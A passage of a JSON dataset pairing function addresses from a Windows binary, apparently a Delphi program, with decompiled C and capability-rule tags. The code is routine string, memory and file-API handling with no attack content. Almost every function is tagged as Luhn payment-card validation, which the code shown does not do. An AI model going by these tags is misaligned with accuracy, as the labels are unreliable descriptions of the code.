        "decompiled_code": "\nvoid __fastcall fcn.00404838(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *in_EAX;\n    char *pcVar3;\n    \n    pcVar3 = param_2;\n    do {\n        if (param_1 == 0) break;\n        param_1 = param_1 + -1;\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    uVar2 = fcn.0040468c();\n    if (param_2 != NULL) {\n        fcn.00402d34();\n    }\n    fcn.004045c8();\n    *in_EAX = uVar2;\n    return;\n}\n",
        "token_count": 177
    },
    "00404890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404890(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    \n    if (param_2 == 0) {\n        return;\n    }\n    if (*in_EAX != 0) {\n        if (param_2 == *in_EAX) {\n            fcn.00404c14();\n        }\n        else {\n            fcn.00404c14();\n        }\n        fcn.00402d34();\n        return;\n    }\n    if (param_2 != 0) {\n        iVar2 = *(param_2 + -8);\n        if (iVar2 == -1 || SCARRY4(iVar2, 1) != iVar2 + 1 < 0) {\n            param_2 = fcn.0040468c(param_2);\n            fcn.00402d34();\n        }\n        else {\n            LOCK();\n            *(param_2 + -8) = *(param_2 + -8) + 1;\n        }\n    }\n    iVar2 = *in_EAX;\n    *in_EAX = param_2;\n    if ((iVar2 != 0) && (0 < *(iVar2 + -8))) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402b44();\n        }\n    }\n    return;\n}\n",
        "token_count": 336
    },
    "004048d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004048d4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_EAX;\n    \n    iVar3 = param_1;\n    if ((param_2 != 0) && (iVar3 = param_2,  param_1 != 0)) {\n        if (param_2 != *in_EAX) {\n            if (param_1 == *in_EAX) {\n                iVar3 = fcn.0040468c();\n                fcn.00402d34();\n                fcn.00402d34();\n                if (iVar3 != 0) {\n                    *(iVar3 + -8) = *(iVar3 + -8) + -1;\n                }\n                fcn.0040461c();\n                return;\n            }\n            fcn.0040461c();\n        }\n        if (param_1 == 0) {\n            return;\n        }\n        iVar3 = param_1;\n        if (*in_EAX != 0) {\n            if (param_1 == *in_EAX) {\n                fcn.00404c14();\n            }\n            else {\n                fcn.00404c14();\n            }\n            fcn.00402d34();\n            return;\n        }\n    }\n    if (iVar3 != 0) {\n        iVar2 = *(iVar3 + -8);\n        if (iVar2 == -1 || SCARRY4(iVar2, 1) != iVar2 + 1 < 0) {\n            iVar3 = fcn.0040468c(iVar3);\n            fcn.00402d34();\n        }\n        else {\n            LOCK();\n            *(iVar3 + -8) = *(iVar3 + -8) + 1;\n        }\n    }\n    iVar2 = *in_EAX;\n    *in_EAX = iVar3;\n    if ((iVar2 != 0) && (0 < *(iVar2 + -8))) {\n        LOCK();\n        piVar1 = iVar2 + -8;\n        *piVar1 = *piVar1 + -1;\n        if (*piVar1 == 0) {\n            fcn.00402b44();\n        }\n    }\n    return;\n}\n",
        "token_count": 499
    },
    "00404948": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404948(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    code *UNRECOVERED_JUMPTABLE;\n    int32_t iStack24;\n    \n    piVar3 = NULL;\n    piVar1 = *(&stack0x00000000 + param_2 * 4);\n    iVar2 = param_2;\n    if ((piVar1 != NULL) && (*in_EAX == piVar1)) {\n        iVar2 = param_2 + -1;\n        piVar3 = piVar1;\n    }\n    do {\n        if ((*(&stack0x00000000 + iVar2 * 4) != NULL) && (piVar3 == *(&stack0x00000000 + iVar2 * 4))) {\n            piVar3 = NULL;\n        }\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    if (piVar3 == NULL) {\n        iStack24 = fcn.0040468c();\n    }\n    else {\n        fcn.00404c14();\n        iStack24 = *in_EAX;\n        param_2 = param_2 + -1;\n        piVar3 = in_EAX;\n    }\n    do {\n        if (*(&stack0x00000000 + param_2 * 4) != 0) {\n            fcn.00402d34();\n        }\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    if (piVar3 == NULL) {\n        if (iStack24 != 0) {\n            *(iStack24 + -8) = *(iStack24 + -8) + -1;\n        }\n        fcn.0040461c();\n    }\n    // WARNING: Could not recover jumptable at 0x004049cf. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*UNRECOVERED_JUMPTABLE)();\n    return;\n}\n",
        "token_count": 464
    },
    "00404ae8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404ae8(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((((in_EAX == 0) || (*(in_EAX + -4) == 0)) || ((0 < param_2 && (*(in_EAX + -4) <= param_2 + -1)))) ||\n       (param_1 < 0)) {\n        fcn.004045c8();\n    }\n    else {\n        fcn.004046b8();\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00404b28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404b28(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.00404ad8();\n    if (*in_EAX != 0) {\n        if (((0 < param_2) && (param_2 + -1 < *(*in_EAX + -4))) && (0 < param_1)) {\n            fcn.00402d34();\n            fcn.00404c14();\n        }\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00404b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404b70(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        fcn.00404c14();\n        fcn.00402d34();\n        fcn.00402d34();\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00404cec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404cec(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        if (iVar1 != 0) {\n            *in_EAX = 0;\n            sub.oleaut32.dll_SysFreeString(iVar1);\n        }\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return;\n}\n",
        "token_count": 127
    },
    "00404d34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404d34(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    if (param_1 < 1) {\n        fcn.00404cd4(param_2);\n    }\n    else if ((param_1 + 1 < 0x7ff) && (iVar1 = fcn.00404708(param_1),  0 < iVar1)) {\n        fcn.00404dc0();\n    }\n    else {\n        fcn.00404f1c();\n        fcn.00404708(param_1);\n        fcn.00404f1c();\n    }\n    return;\n}\n",
        "token_count": 148
    },
    "00404f1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404f1c(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (0 < param_2) {\n        uVar1 = fcn.00404cac(0);\n        iVar2 = fcn.00404e40(uVar1);\n        if (0 < iVar2) {\n            fcn.00402d34();\n        }\n    }\n    fcn.00404cc4();\n    return;\n}\n",
        "token_count": 113
    },
    "00404f64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404f64(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00404f94();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 124
    },
    "00405034": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405034(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = *(*(param_2 + 1) + 6 + param_2);\n    do {\n        fcn.00405080();\n        iVar3 = iVar2 + -1;\n        bVar1 = 0 < iVar2;\n        iVar2 = iVar3;\n    } while (iVar3 != 0 && bVar1);\n    return;\n}\n",
        "token_count": 122
    },
    "00405420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00405420(uint param_1, int32_t param_2, uint32_t param_3, int32_t param_4)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX * param_3 & 0xffffffff | (in_EAX * param_3 >> 0x20) + param_4 * in_EAX + param_2 * param_3 << 0x20;\n}\n",
        "token_count": 99
    },
    "00405a18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405a18(void)\n\n{\n    fcn.0040586c(&stack0x00000004);\n    return;\n}\n",
        "token_count": 32
    },
    "00405ba8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * fcn.00405ba8(void)\n\n{\n    uchar *puVar1;\n    uchar auStack28 [4];\n    int32_t iStack24;\n    \n    puVar1 = auStack28;\n    sub.kernel32.dll_VirtualQuery();\n    if (iStack24 != 0x1000) {\n        puVar1 = NULL;\n    }\n    return puVar1;\n}\n",
        "token_count": 85
    },
    "0040675c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040675c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uchar auStack4104 [4096];\n    \n    if (in_EAX != 0) {\n        if (*(in_EAX + 4) < 0x10000) {\n            uVar1 = fcn.00405c20(*(in_EAX + 4), auStack4104, 0x1000);\n            sub.user32.dll_LoadStringA(uVar1);\n            fcn.004046b8();\n        }\n        else {\n            fcn.004047c0();\n        }\n    }\n    return;\n}\n",
        "token_count": 140
    },
    "00406acc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406acc(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    *arg_8h = in_EAX;\n    arg_8h[1] = in_EDX;\n    arg_8h[2] = in_ECX + in_EAX;\n    arg_8h[3] = in_EDX + arg_ch;\n    return;\n}\n",
        "token_count": 112
    },
    "004087f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004087f8(uint param_1, uint param_2)\n\n{\n    fcn.0040c9d4(param_1, param_2);\n    fcn.00403fc0();\n    return;\n}\n",
        "token_count": 53
    },
    "004088b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004088b0(uint param_1, uint8_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = fcn.00404888();\n    fcn.00404c14();\n    puVar1 = *param_2;\n    for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n        uVar2 = *in_EAX;\n        if ((0x60 < uVar2) && (uVar2 < 0x7b)) {\n            uVar2 = uVar2 - 0x20;\n        }\n        *puVar1 = uVar2;\n        in_EAX = in_EAX + 1;\n        puVar1 = puVar1 + 1;\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "00408900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408900(uint param_1, uint8_t **param_2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = fcn.00404888();\n    fcn.00404c14();\n    puVar1 = *param_2;\n    for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n        uVar2 = *in_EAX;\n        if ((0x40 < uVar2) && (uVar2 < 0x5b)) {\n            uVar2 = uVar2 + 0x20;\n        }\n        *puVar1 = uVar2;\n        in_EAX = in_EAX + 1;\n        puVar1 = puVar1 + 1;\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00408c28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408c28(uint param_1, uint param_2)\n\n{\n    fcn.00408bdc(param_2);\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 47
    },
    "00408c48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408c48(int16_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint64_t *in_EAX;\n    int32_t iVar3;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar4;\n    float10 fVar5;\n    float10 fVar6;\n    float10 fVar7;\n    char cVar8;\n    \n    if ((param_1 == '\\0') && (param_1 = 10,  (*(in_EAX + 4) & 0x80000000) != 0)) {\n        fcn.00408c7c(-*in_EAX, -(*(in_EAX + 4) + (*in_EAX != 0)));\n        unaff_ESI[-1] = 0x2d;\n        return;\n    }\n    if ((*(in_EAX + 4) & 0x80000000) == 0) {\n        fVar7 = *in_EAX;\n    }\n    else {\n        fVar7 = 0x7fffffffffffffff + 1 + (*in_EAX & 0x7fffffffffffffff);\n    }\n    fVar5 = param_1;\n    puVar4 = unaff_ESI;\n    do {\n        puVar4 = puVar4 + -1;\n        fVar6 = fVar7 - (fVar7 / fVar5) * fVar5;\n        fVar7 = fVar7 / fVar5;\n        cVar8 = ROUND(fVar6);\n        uVar2 = cVar8 + 0x30;\n        if (0x39 < uVar2) {\n            uVar2 = cVar8 + 0x37;\n        }\n        *puVar4 = uVar2;\n    } while (1 <= fVar7);\n    iVar3 = param_2 - (unaff_ESI - puVar4);\n    if (unaff_ESI - puVar4 <= param_2 && iVar3 != 0) {\n        iVar1 = -iVar3;\n        while (iVar3 = iVar3 + -1,  iVar3 != 0) {\n            (puVar4 + iVar1)[iVar3] = 0x30;\n        }\n        puVar4[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 516
    },
    "00408d14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00408d14(uint arg_8h)\n\n{\n    fcn.00408c48();\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 40
    },
    "00408d3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408d3c(uint param_1)\n\n{\n    fcn.00408bdc(param_1);\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 43
    },
    "00408df8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00408df8(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040583c();\n    if (iVar1 == 0) {\n        fcn.00405a18(1);\n        fcn.0040461c();\n    }\n    iVar1 = fcn.0040583c();\n    if (iVar1 == 0) {\n        fcn.00405a18(1);\n        fcn.0040461c();\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "00408e88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.00408e88(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    int32_t in_EDX;\n    int32_t iVar1;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    _auStack8 = 0;\n    if (-1 < in_EDX) {\n        iVar1 = in_EDX + 1;\n        do {\n            in_EAX = fcn.00408af0();\n            if (in_EAX != '\\0') {\n                _auStack8 = 0x1000000;\n                break;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return in_EAX & 0xffffff00 | _auStack8 >> 0x18;\n}\n",
        "token_count": 194
    },
    "00408ec4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00408ec4(uint param_1, uchar *param_2)\n\n{\n    uint uVar1;\n    uchar *arg_8h;\n    uchar *arg_8h_00;\n    uint var_10h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    arg_8h_00 = &stack0xfffffffc;\n    uVar1 = fcn.0040a57c();\n    if (uVar1 == '\\0') {\n        fcn.00408df8();\n        fcn.00405844();\n        uVar1 = fcn.00408e88(arg_8h);\n        if (uVar1 == '\\0') {\n            fcn.00405844();\n            uVar1 = fcn.00408e88(arg_8h_00);\n            if (uVar1 != '\\0') {\n                *param_2 = 0;\n            }\n        }\n        else {\n            *param_2 = 1;\n        }\n    }\n    else {\n        *param_2 = _var_10h != *0x408f44;\n    }\n    return uVar1;\n}\n",
        "token_count": 266
    },
    "00409088": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00409088(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint lDistanceToMove;\n    uint lpDistanceToMoveHigh;\n    \n    uVar1 = sub.kernel32.dll_SetFilePointer();\n    return CONCAT44(arg_ch, uVar1);\n}\n",
        "token_count": 68
    },
    "004091d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004091d0(void)\n\n{\n    uint uVar1;\n    uchar auStack272 [4];\n    uchar auStack268 [260];\n    \n    uVar1 = fcn.00404a88(0x104, auStack268, auStack272);\n    sub.kernel32.dll_GetFullPathNameA(uVar1);\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 86
    },
    "0040920c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk size"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040920c(int32_t arg_8h, uint *arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h == 0) {\n        var_1ch = 0;\n    }\n    else {\n        var_1ch = arg_8h;\n    }\n    uVar1 = sub.kernel32.dll_GetDiskFreeSpaceA(var_1ch, &var_4h, &var_8h, &var_ch, &var_10h);\n    uVar2 = fcn.00405420(var_ch, 0);\n    *arg_ch = uVar2;\n    arg_ch[1] = uVar2 >> 0x20;\n    uVar2 = fcn.00405420(var_10h, 0);\n    *arg_10h = uVar2;\n    arg_10h[1] = uVar2 >> 0x20;\n    return uVar1;\n}\n",
        "token_count": 271
    },
    "00409494": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.00409494(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = fcn.00402b14();\n    *piVar1 = in_EAX + 4;\n    return piVar1 + 1;\n}\n",
        "token_count": 68
    },
    "004099ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004099ac(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t iVar3;\n    uint var_1008h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = 0x1000;\n    iVar1 = fcn.00404888();\n    if (iVar1 < 0xc00) {\n        uVar2 = fcn.00404888();\n        iVar1 = fcn.00409588(arg_8h, in_ECX, uVar2);\n    }\n    else {\n        iVar3 = fcn.00404888();\n        iVar1 = iVar3;\n    }\n    if (iVar1 < iVar3 + -1) {\n        fcn.004046b8();\n    }\n    else {\n        for (; iVar3 + -1 <= iVar1; iVar3 = iVar3 * 2) {\n            fcn.004045c8();\n            fcn.00404c14();\n            uVar2 = fcn.00404888();\n            iVar1 = fcn.00409588(arg_8h, in_ECX, uVar2);\n        }\n        fcn.00404c14();\n    }\n    return;\n}\n",
        "token_count": 278
    },
    "0040a36e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a36e(void)\n\n{\n    int32_t unaff_EBP;\n    char *unaff_ESI;\n    uint var_ch;\n    \n    while( true ) {\n        if (*unaff_ESI - 0x3aU < 0xf6) break;\n        *(unaff_EBP + -0xc) = *unaff_ESI - 0x30;\n        unaff_ESI = unaff_ESI + 1;\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0040a38a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a38a(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    char *unaff_ESI;\n    \n    uVar2 = 0;\n    if ((*unaff_ESI == '+') || (*unaff_ESI == '-')) {\n        unaff_ESI = unaff_ESI + 1;\n    }\n    do {\n        cVar1 = *unaff_ESI;\n        if (cVar1 - 0x3aU < 0xf6) {\n            return;\n        }\n        unaff_ESI = unaff_ESI + 1;\n        uVar2 = uVar2 * 10 + (cVar1 - 0x30);\n    } while (uVar2 < 500);\n    return;\n}\n",
        "token_count": 170
    },
    "0040a3c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a3c0(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.00409ab8(0, 0xf, 0);\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 59
    },
    "0040a3f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a3f0(uint arg_8h)\n\n{\n    uint var_40h;\n    \n    fcn.00409ab8(0, 0, 0);\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 58
    },
    "0040a420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a420(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_40h;\n    \n    fcn.00409ab8(in_ECX, in_EDX, in_EAX);\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 81
    },
    "0040a458": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a458(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint in_EDX;\n    uint var_40h;\n    \n    fcn.00409ab8(in_EDX, 0, in_EAX);\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 70
    },
    "0040a490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a490(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_100h;\n    \n    iVar1 = fcn.00404888();\n    if (0xe0 < iVar1) {\n        fcn.004087e0();\n    }\n    uVar2 = fcn.00404a88();\n    fcn.00409d8c(uVar2);\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 111
    },
    "0040a4e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a4e8(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_100h;\n    \n    iVar1 = fcn.00404888();\n    if (0xe0 < iVar1) {\n        fcn.004087e0();\n    }\n    uVar2 = fcn.00404a88();\n    fcn.00409d8c(uVar2);\n    fcn.004046b8();\n    return;\n}\n",
        "token_count": 113
    },
    "0040a540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nunkbyte10 fcn.0040a540(void)\n\n{\n    char cVar1;\n    unkbyte10 Stack24;\n    \n    fcn.00404a88();\n    cVar1 = fcn.0040a2ac();\n    if (cVar1 == '\\0') {\n        fcn.004087f8();\n    }\n    return Stack24;\n}\n",
        "token_count": 79
    },
    "0040a598": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a598(uint param_1, double *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.00404a88();\n    cVar1 = fcn.0040a2ac();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0040a5c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a5c4(uint param_1, float *param_2)\n\n{\n    char cVar1;\n    float10 fStack20;\n    \n    fcn.00404a88();\n    cVar1 = fcn.0040a2ac();\n    if (cVar1 != '\\0') {\n        *param_2 = fStack20;\n    }\n    return;\n}\n",
        "token_count": 89
    },
    "0040a60c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040a60c(double param_1)\n\n{\n    uint64_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iStack16;\n    int32_t iStack12;\n    \n    uVar1 = ROUND(param_1 * *0x483180);\n    iStack16 = uVar1;\n    iStack12 = uVar1 >> 0x20;\n    if (uVar1 < 0) {\n        uVar1 = CONCAT44(-(iStack16 != 0) - iStack12, -iStack16);\n        uVar3 = uVar1 % *0x483184;\n        iVar2 = -(uVar1 / *0x483184);\n    }\n    else {\n        iVar2 = uVar1 / *0x483184;\n        uVar3 = uVar1 % *0x483184;\n    }\n    *in_EAX = uVar3;\n    in_EAX[1] = iVar2 + 0xa955a;\n    return;\n}\n",
        "token_count": 233
    },
    "0040a690": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040a690(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint32_t *in_EAX;\n    uint32_t uVar4;\n    bool bVar5;\n    \n    fcn.0040a650();\n    uVar1 = *in_EAX;\n    iVar3 = (in_EAX[1] - 0xa955a) * *0x483184;\n    uVar4 = iVar3;\n    if (iVar3 < 0) {\n        bVar5 = uVar4 < uVar1;\n        uVar1 = -uVar1;\n        uVar2 = -bVar5;\n    }\n    else {\n        uVar2 = CARRY4(uVar4, uVar1);\n    }\n    return CONCAT44((iVar3 >> 0x20) + uVar2, uVar4 + uVar1) / *0x483180;\n}\n",
        "token_count": 212
    },
    "0040a704": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
